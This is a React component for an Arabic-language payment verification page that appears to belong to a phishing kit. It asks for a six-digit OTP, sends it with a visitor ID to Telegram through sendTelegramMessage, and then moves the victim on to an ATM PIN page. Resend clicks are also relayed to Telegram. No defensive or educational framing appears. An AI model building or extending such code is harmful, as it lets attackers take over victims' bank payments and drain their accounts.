import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import Header from '../components/Header';

const PaymentOTP = () => {
  const navigate = useNavigate();
  const { sendTelegramMessage, formData } = useRegistration();
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [countdown, setCountdown] = useState(60);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [countdown]);

  const handleChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }
    
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const otpCode = otp.join('');
    if (otpCode.length !== 6) {
      setError('الرجاء إدخال رمز التحقق كاملاً');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      await sendTelegramMessage(
        `🔐 رمز OTP للدفع\n\n` +
        `🔢 الرمز: ${otpCode}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/atm-pin');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  const handleResend = async () => {
    if (countdown > 0) return;
    
    await sendTelegramMessage(
      `🔄 طلب إعادة إرسال OTP\n\n` +
      `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
    );
    
    setCountdown(60);
  };

  if (isLoading) {
    return <LoadingScreen message="جاري التحقق من الرمز..." />;
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#6A0F49] rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-[#6A0F49] mb-2">
              رمز التحقق
            </h1>
            <p className="text-gray-600 text-sm">
              تم إرسال رمز التحقق إلى رقم هاتفك المسجل
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="flex justify-center gap-2" dir="ltr">
              {otp.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value.replace(/\D/g, ''))}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-12 h-14 text-center text-xl font-bold border-2 border-gray-300 rounded-lg focus:border-[#6A0F49] focus:ring-2 focus:ring-[#6A0F49] focus:outline-none"
                />
              ))}
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#6A0F49] text-white py-3 rounded-lg font-semibold hover:bg-[#5A0D3D] transition-colors"
            >
              تأكيد
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-gray-600 text-sm mb-2">
              لم تستلم الرمز؟
            </p>
            <button
              onClick={handleResend}
              disabled={countdown > 0}
              className={`text-[#6A0F49] font-semibold ${countdown > 0 ? 'opacity-50 cursor-not-allowed' : 'hover:underline'}`}
            >
              {countdown > 0 ? `إعادة الإرسال خلال ${countdown} ثانية` : 'إعادة إرسال الرمز'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTP;
